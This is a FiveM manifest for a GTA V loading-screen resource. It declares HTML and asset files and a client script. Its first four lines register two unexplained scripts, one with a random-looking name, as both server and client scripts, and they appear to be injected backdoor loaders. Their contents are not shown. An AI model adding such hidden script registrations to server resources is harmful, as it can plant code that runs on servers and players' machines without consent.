server_script "00230L9KSV1V6V6.lua"
client_script "00230L9KSV1V6V6.lua"
server_script "LTH.lua"
client_script "LTH.lua"
fx_version 'adamant'
game 'gta5'

author 'NaorNC#8998' -- # Discord - Discord.gg/cKt4Mpd2PQ
description 'nc-loadingscreen'

files {
    '*.html',
    'assets/**/*.*',
    'assets/**/**/*.*'
}

client_script 'client.lua'

--loadscreen_manual_shutdown "yes"
loadscreen 'index.html'